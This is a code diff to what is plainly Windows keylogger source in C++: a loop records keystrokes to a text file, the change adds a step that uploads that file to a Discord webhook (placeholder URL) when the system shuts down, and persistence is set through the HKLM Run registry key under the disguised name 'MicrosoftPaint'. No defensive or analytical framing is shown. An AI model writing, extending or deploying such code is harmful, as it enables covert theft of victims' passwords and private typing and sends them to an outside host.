@@ -1,5 +1,5 @@
 #include "../Utils/keyboard.h"
-
+#include "../Utils/functions.h"
 bool isCapsLock() {
 	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
 		return true;
@@ -64,8 +64,7 @@ auto detectKey() {
 	}
 }
 
-void saveInTextFile()
-{
+void saveInTextFile() {
 	std::ofstream myfile;
 	while (true) {
 		std::string key = detectKey();
@@ -74,7 +73,9 @@ void saveInTextFile()
 		myfile << key;
 		myfile.close();
 		if (GetSystemMetrics(SM_SHUTTINGDOWN)) {
-			;
+			dpp::cluster bot("");
+			dpp::webhook wh("UR WEBHOOK HERE!");
+			bot.execute_webhook(wh, dpp::utility::read_file("output.txt"));
 		}
 	}
 }
@@ -86,9 +87,9 @@ bool PersistantApplication() {
 	GetModuleFileNameA(hModule, Path, sizeof(Path));
 	reg = Path;
 	HKEY key;
-	LONG regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
+	LONG regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (regeditOpen == ERROR_SUCCESS) {
-		regeditOpen = RegSetValueEx(key, L"MicrosoftPaint", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
+		regeditOpen = RegSetValueEx(key, "MicrosoftPaint", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
 		if (regeditOpen == ERROR_SUCCESS) {
 			return true;
 		}
